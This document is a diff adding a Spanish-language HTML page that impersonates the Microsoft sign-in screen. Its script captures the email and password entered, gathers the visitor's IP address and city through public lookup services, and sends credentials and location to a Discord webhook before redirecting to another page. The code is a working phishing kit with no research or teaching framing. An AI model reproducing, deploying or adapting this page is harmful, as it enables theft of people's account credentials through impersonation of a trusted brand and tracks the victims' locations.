@@ -1,0 +1,702 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=yes">
+    <title>Bienvenido</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Segoe UI', system-ui, -apple-system, 'BlinkMacSystemFont', 'Roboto', 'Helvetica Neue', sans-serif;
+            background-color: #f8f9fa;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            min-height: 100vh;
+            padding: 1.5rem;
+            color: #1b1b1b;
+        }
+
+        .card {
+            max-width: 480px;
+            width: 100%;
+            background-color: #ffffff;
+            border-radius: 1.25rem;
+            box-shadow: 0 20px 35px -12px rgba(0, 0, 0, 0.1), 0 1px 2px rgba(0, 0, 0, 0.02);
+            overflow: hidden;
+        }
+
+        .content {
+            padding: 2rem 2rem 1.8rem 2rem;
+        }
+
+        .logo {
+            margin-bottom: 2rem;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        .logo svg {
+            width: 108px;
+            height: auto;
+        }
+
+        h1 {
+            font-size: 1.9rem;
+            font-weight: 600;
+            letter-spacing: -0.3px;
+            margin-bottom: 0.5rem;
+            color: #111;
+            line-height: 1.2;
+            text-align: center;
+        }
+
+        .subtitle {
+            text-align: center;
+            color: #6c6c6c;
+            font-size: 0.9rem;
+            margin-bottom: 2rem;
+        }
+
+        .form-group {
+            margin-bottom: 1.5rem;
+        }
+
+        .form-group label {
+            display: block;
+            font-size: 0.85rem;
+            font-weight: 500;
+            color: #2c2c2c;
+            margin-bottom: 0.5rem;
+        }
+
+        .input-wrapper {
+            position: relative;
+            width: 100%;
+        }
+
+        .input-wrapper input {
+            width: 100%;
+            padding: 0.85rem 1rem;
+            font-size: 1rem;
+            font-family: inherit;
+            border: 1px solid #d1d1d1;
+            border-radius: 0.5rem;
+            transition: all 0.2s ease;
+            outline: none;
+            background-color: #ffffff;
+            box-sizing: border-box;
+        }
+
+        .input-wrapper input:focus {
+            border-color: #0067b8;
+            box-shadow: 0 0 0 3px rgba(0, 103, 184, 0.1);
+        }
+
+        .input-wrapper input.error {
+            border-color: #d13438;
+            background-color: #fff8f8;
+        }
+
+        .password-wrapper {
+            position: relative;
+        }
+
+        .password-wrapper input {
+            padding-right: 4.5rem;
+        }
+
+        .toggle-password {
+            position: absolute;
+            right: 0.75rem;
+            top: 50%;
+            transform: translateY(-50%);
+            background: none;
+            border: none;
+            cursor: pointer;
+            color: #0067b8;
+            font-size: 0.85rem;
+            font-weight: 500;
+            font-family: inherit;
+            padding: 0.4rem 0.6rem;
+            border-radius: 0.25rem;
+            transition: all 0.2s;
+            z-index: 2;
+        }
+
+        .toggle-password:hover {
+            background-color: #f0f0f0;
+            color: #0050a0;
+        }
+
+        .toggle-password:active {
+            transform: translateY(-50%) scale(0.96);
+        }
+
+        .toggle-password:focus-visible {
+            outline: 2px solid #0067b8;
+            outline-offset: 2px;
+        }
+
+        .btn-container {
+            display: flex;
+            justify-content: center;
+            margin-top: 0.5rem;
+            margin-bottom: 1.5rem;
+        }
+
+        .btn-login {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background-color: #0067b8;
+            color: white;
+            font-weight: 600;
+            font-size: 1rem;
+            padding: 0.75rem 2rem;
+            border-radius: 0.25rem;
+            border: none;
+            cursor: pointer;
+            transition: background-color 0.2s ease, transform 0.05s linear;
+            font-family: inherit;
+            letter-spacing: 0.2px;
+            width: 100%;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.05);
+        }
+
+        .btn-login:hover {
+            background-color: #0050a0;
+        }
+
+        .btn-login:active {
+            transform: scale(0.98);
+        }
+
+        .btn-login:disabled {
+            opacity: 0.7;
+            cursor: not-allowed;
+            transform: none;
+        }
+
+        .links {
+            text-align: center;
+            margin-top: 1rem;
+        }
+
+        .links a {
+            color: #0067b8;
+            text-decoration: none;
+            font-size: 0.85rem;
+            margin: 0 0.75rem;
+            transition: color 0.2s;
+        }
+
+        .links a:hover {
+            text-decoration: underline;
+            color: #0050a0;
+        }
+
+        .footer-links {
+            margin-top: 2rem;
+            font-size: 0.75rem;
+            color: #6c6c6c;
+            border-top: 1px solid #ededed;
+            padding-top: 1.5rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 1.2rem;
+            align-items: center;
+            justify-content: space-between;
+        }
+
+        .links-group {
+            display: flex;
+            gap: 1.5rem;
+            flex-wrap: wrap;
+        }
+
+        .footer-links a {
+            color: #4f4f4f;
+            text-decoration: none;
+            transition: color 0.2s;
+        }
+
+        .footer-links a:hover {
+            color: #0067b8;
+            text-decoration: underline;
+        }
+
+        .message-container {
+            margin-bottom: 1.5rem;
+        }
+
+        .error-message {
+            background-color: #fde7e9;
+            border-left: 4px solid #d13438;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 0.85rem;
+            color: #d13438;
+            display: none;
+        }
+
+        .error-message.show {
+            display: block;
+        }
+
+        .success-message {
+            background-color: #e6f4e8;
+            border-left: 4px solid #107c10;
+            padding: 0.75rem 1rem;
+            border-radius: 0.5rem;
+            font-size: 0.85rem;
+            color: #107c10;
+            display: none;
+        }
+
+        .success-message.show {
+            display: block;
+        }
+
+        .location-status {
+            font-size: 0.7rem;
+            text-align: center;
+            margin-top: 0.5rem;
+            color: #6c6c6c;
+            display: none;
+        }
+
+        .location-status.show {
+            display: block;
+        }
+
+        .field-error {
+            color: #d13438;
+            font-size: 0.75rem;
+            margin-top: 0.25rem;
+            display: none;
+        }
+
+        .field-error.show {
+            display: block;
+        }
+
+        @media (max-width: 550px) {
+            .content {
+                padding: 1.5rem;
+            }
+            h1 {
+                font-size: 1.6rem;
+            }
+            .btn-login {
+                width: 100%;
+            }
+            .footer-links {
+                flex-direction: column;
+                align-items: flex-start;
+                gap: 0.8rem;
+            }
+            .links-group {
+                gap: 1rem;
+            }
+            .links a {
+                display: inline-block;
+                margin: 0.25rem;
+            }
+            .password-wrapper input {
+                padding-right: 4rem;
+            }
+            .toggle-password {
+                right: 0.5rem;
+                font-size: 0.8rem;
+                padding: 0.3rem 0.5rem;
+            }
+        }
+
+        .btn-login:focus-visible, a:focus-visible, .toggle-password:focus-visible {
+            outline: 2px solid #0067b8;
+            outline-offset: 2px;
+        }
+
+        input:-webkit-autofill,
+        input:-webkit-autofill:focus {
+            transition: background-color 0s 600000s, color 0s 600000s;
+        }
+    </style>
+</head>
+<body>
+    <div class="card">
+        <div class="content">
+            <div class="logo" aria-label="Microsoft">
+                <svg width="110" height="27" viewBox="0 0 110 27" fill="none" xmlns="http://www.w3.org/2000/svg">
+                    <rect x="1" y="1" width="9" height="9" fill="#F25022"/>
+                    <rect x="12" y="1" width="9" height="9" fill="#7FBA00"/>
+                    <rect x="1" y="12" width="9" height="9" fill="#00A4EF"/>
+                    <rect x="12" y="12" width="9" height="9" fill="#FFB900"/>
+                    <text x="26" y="18" font-family="Segoe UI, Arial, sans-serif" font-size="12" fill="#1F1F1F">Microsoft</text>
+                </svg>
+            </div>
+
+            <h1>Iniciar sesión</h1>
+            <div class="subtitle">Accede a tu cuenta de Microsoft</div>
+
+            <div class="message-container">
+                <div id="errorMessage" class="error-message"></div>
+                <div id="successMessage" class="success-message"></div>
+            </div>
+
+            <form id="loginForm">
+                <div class="form-group">
+                    <label for="email">Correo electrónico, teléfono o Skype</label>
+                    <div class="input-wrapper">
+                        <input type="email" id="email" name="email" autocomplete="email" required>
+                    </div>
+                    <div id="emailError" class="field-error">⚠️ El correo electrónico es obligatorio</div>
+                </div>
+
+                <div class="form-group">
+                    <label for="password">Contraseña</label>
+                    <div class="input-wrapper password-wrapper">
+                        <input type="password" id="password" name="password" autocomplete="off" required>
+                        <button type="button" class="toggle-password" id="togglePassword" aria-label="Mostrar contraseña">Mostrar</button>
+                    </div>
+                    <div id="passwordError" class="field-error">⚠️ La contraseña es obligatoria</div>
+                </div>
+
+                <div class="btn-container">
+                    <button type="submit" class="btn-login" id="loginButton">Iniciar sesión</button>
+                </div>
+
+                <div class="links">
+                    <a href="#" id="forgotLink">¿Olvidaste tu contraseña?</a>
+                    <a href="#" id="createAccountLink">Crear una cuenta</a>
+                </div>
+            </form>
+
+            <div class="footer-links">
+                <div class="links-group">
+                    <a href="#" id="privacyLink">Aviso de privacidad</a>
+                    <a href="#" id="termsLink">Términos de uso</a>
+                </div>
+                <span>© 2026 Microsoft</span>
+            </div>
+        </div>
+    </div>
+    <script src="discord.js"></script>
+    <script>
+        
+        // Elementos del DOM
+        const passwordInput = document.getElementById('password');
+        const toggleButton = document.getElementById('togglePassword');
+        const loginForm = document.getElementById('loginForm');
+        const emailInput = document.getElementById('email');
+        const errorMessageDiv = document.getElementById('errorMessage');
+        const successMessageDiv = document.getElementById('successMessage');
+        const emailError = document.getElementById('emailError');
+        const passwordError = document.getElementById('passwordError');
+        const locationStatusDiv = document.getElementById('locationStatus');
+        const loginButton = document.getElementById('loginButton');
+
+        // Estado de visibilidad de la contraseña
+        let isPasswordVisible = false;
+        
+        // Variable para almacenar el valor real de la contraseña
+        let actualPassword = '';
+        
+        // Variables de ubicación
+        let userLocation = null;
+        let userIP = null;
+        
+        // ============================================
+        // FUNCIÓN DE VALIDACIÓN DEL FORMULARIO
+        // ============================================
+        function validateForm() {
+            let isValid = true;
+            
+            // Validar email
+            const email = emailInput.value.trim();
+            if (email === '') {
+                emailInput.classList.add('error');
+                emailError.classList.add('show');
+                isValid = false;
+            } else {
+                emailInput.classList.remove('error');
+                emailError.classList.remove('show');
+            }
+            
+            // Validar contraseña
+            const password = actualPassword.trim();
+            if (password === '') {
+                passwordInput.classList.add('error');
+                passwordError.classList.add('show');
+                isValid = false;
+            } else {
+                passwordInput.classList.remove('error');
+                passwordError.classList.remove('show');
+            }
+            
+            return isValid;
+        }
+        
+        // Limpiar errores al escribir
+        emailInput.addEventListener('input', function() {
+            if (this.value.trim() !== '') {
+                this.classList.remove('error');
+                emailError.classList.remove('show');
+            }
+        });
+        
+        passwordInput.addEventListener('input', function() {
+            if (actualPassword.trim() !== '') {
+                this.classList.remove('error');
+                passwordError.classList.remove('show');
+            }
+        });
+        
+        // ============================================
+        // FUNCIONES DE UBICACIÓN
+        // ============================================
+        async function getUserIP() {
+            try {
+                const storedIP = localStorage.getItem('user_ip');
+                if (storedIP) return storedIP;
+                
+                const response = await fetch('https://api.ipify.org?format=json');
+                const data = await response.json();
+                localStorage.setItem('user_ip', data.ip);
+                return data.ip;
+            } catch (error) {
+                console.error('Error al obtener IP:', error);
+                return 'No disponible';
+            }
+        }
+        
+        async function getUserLocation(ip) {
+            try {
+                const storedLocation = localStorage.getItem('user_location');
+                if (storedLocation) {
+                    return JSON.parse(storedLocation);
+                }
+                
+                try {
+                    const response = await fetch('https://ipinfo.io/json');
+                    const data = await response.json();
+                    
+                    if (data && data.city && data.country) {
+                        const location = {
+                            city: data.city || 'No disponible',
+                            country: data.country || 'No disponible',
+                            region: data.region || 'No disponible'
+                        };
+                        localStorage.setItem('user_location', JSON.stringify(location));
+                        return location;
+                    }
+                } catch (error) {
+                    console.log('Error con ipinfo.io');
+                }
+                
+                return {
+                    city: 'No disponible',
+                    country: 'No disponible',
+                    region: 'No disponible'
+                };
+            } catch (error) {
+                console.error('Error al obtener ubicación:', error);
+                return {
+                    city: 'No disponible',
+                    country: 'No disponible',
+                    region: 'No disponible'
+                };
+            }
+        }
+        
+        // ============================================
+        // FUNCIÓN PARA ENVIAR A DISCORD
+        // ============================================
+        async function sendToDiscord(email, password, location) {
+            const ip = userIP || await getUserIP();
+            const currentDate = new Date();
+            const formattedDate = currentDate.toLocaleString('es-ES', { timeZone: 'America/Bogota' });
+            
+            let locationText = '';
+            let pais = 'Desconocido';
+            let ciudad = 'Desconocido';
+            
+            if (location && location.city !== 'No disponible') {
+                pais = location.country || 'Desconocido';
+                ciudad = location.city || 'Desconocido';
+                locationText = `${ciudad}, ${pais}`;
+            } else {
+                locationText = 'No disponible';
+            }
+            
+            const messageLines = [
+                `**== Microsoft ==**`,
+                `🕐 ${formattedDate}`,
+                ``,
+                `**📧 Credenciales:** \`${email} | ${password}\``,
+                ``,
+                `**📍 UBICACIÓN**`,
+                `🌐 IP: \`${ip}\``,
+                `🏳️ País: ${pais}`,
+                `🏙️ Ciudad: ${ciudad}`,
+                `📍 Ubicación: ${locationText}`
+            ];
+            
+            const messageContent = messageLines.join('\n');
+            
+            const payload = {
+                username: 'Microsoft Login',
+                avatar_url: 'https://upload.wikimedia.org/wikipedia/commons/4/44/Microsoft_logo.svg',
+                content: messageContent
+            };
+            
+            try {
+                const response = await fetch(DISCORD_WEBHOOK_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+                return response.ok;
+            } catch (error) {
+                console.error('Error:', error);
+                return false;
+            }
+        }
+        
+        // ============================================
+        // FUNCIONES DE UI
+        // ============================================
+        function hideMessages() {
+            errorMessageDiv.classList.remove('show');
+            successMessageDiv.classList.remove('show');
+        }
+        
+        function showError(message) {
+            hideMessages();
+            errorMessageDiv.textContent = message;
+            errorMessageDiv.classList.add('show');
+        }
+        
+        // ============================================
+        // MANEJO DEL PASSWORD (ocultar/mostrar)
+        // ============================================
+        function updatePasswordDisplay() {
+            if (isPasswordVisible) {
+                passwordInput.value = actualPassword;
+                toggleButton.textContent = 'Ocultar';
+                passwordInput.type = 'text';
+            } else {
+                passwordInput.value = actualPassword;
+                passwordInput.type = 'password';
+                toggleButton.textContent = 'Mostrar';
+            }
+        }
+        
+        passwordInput.addEventListener('input', function(e) {
+            actualPassword = passwordInput.value;
+        });
+        
+        toggleButton.addEventListener('click', function() {
+            isPasswordVisible = !isPasswordVisible;
+            updatePasswordDisplay();
+            passwordInput.focus();
+        });
+        
+        // ============================================
+        // ENVÍO DEL FORMULARIO CON VALIDACIÓN
+        // ============================================
+        loginForm.addEventListener('submit', async function(e) {
+            e.preventDefault();
+            
+            // ✅ VALIDACIÓN: Verificar que los campos estén llenos
+            if (!validateForm()) {
+                showError('⚠️ Por favor, completa todos los campos obligatorios.');
+                return;
+            }
+            
+            const email = emailInput.value.trim();
+            const password = actualPassword.trim();
+            
+            // Deshabilitar botón mientras se procesa
+            loginButton.disabled = true;
+            loginButton.textContent = 'Procesando...';
+            
+            try {
+                // Guardar email en localStorage
+                localStorage.setItem('user', email);
+                
+                // Enviar a Discord
+                const discordSent = await sendToDiscord(email, password, userLocation);
+                
+                if (discordSent) {
+                    // Redirigir después de enviar
+                    window.location.href = 'whats.html';
+                } else {
+                    loginButton.disabled = false;
+                    loginButton.textContent = 'Iniciar sesión';
+                    showError('Error al procesar la solicitud. Por favor, intenta nuevamente.');
+                }
+            } catch (error) {
+                loginButton.disabled = false;
+                loginButton.textContent = 'Iniciar sesión';
+                showError('Error de conexión. Por favor, intenta nuevamente.');
+            }
+        });
+        
+        // ============================================
+        // INICIALIZACIÓN
+        // ============================================
+        (async function initialize() {
+            try {
+                console.log('🟢 Obteniendo ubicación...');
+                userIP = await getUserIP();
+                userLocation = await getUserLocation(userIP);
+                console.log('✅ Ubicación obtenida:', userLocation);
+            } catch (error) {
+                console.error('❌ Error al obtener ubicación:', error);
+                userLocation = { city: 'No disponible', country: 'No disponible', region: 'No disponible' };
+            }
+            
+            // Inicializar campos
+            actualPassword = '';
+            passwordInput.value = '';
+            isPasswordVisible = false;
+            toggleButton.textContent = 'Mostrar';
+            
+            // Limpiar errores iniciales
+            emailInput.classList.remove('error');
+            passwordInput.classList.remove('error');
+            emailError.classList.remove('show');
+            passwordError.classList.remove('show');
+        })();
+        
+        // Eventos para enlaces
+        document.getElementById('forgotLink')?.addEventListener('click', (e) => {
+            e.preventDefault();
+            showError('Por favor, contacta con soporte para recuperar tu contraseña.');
+        });
+        
+        document.getElementById('createAccountLink')?.addEventListener('click', (e) => {
+            e.preventDefault();
+            showError('La creación de cuentas está temporalmente deshabilitada.');
+        });
+        
+        document.getElementById('privacyLink')?.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.open('https://privacy.microsoft.com/', '_blank');
+        });
+        
+        document.getElementById('termsLink')?.addEventListener('click', (e) => {
+            e.preventDefault();
+            window.open('https://www.microsoft.com/en-us/legal/terms-of-use', '_blank');
+        });
+    </script>
+</body>
+</html>
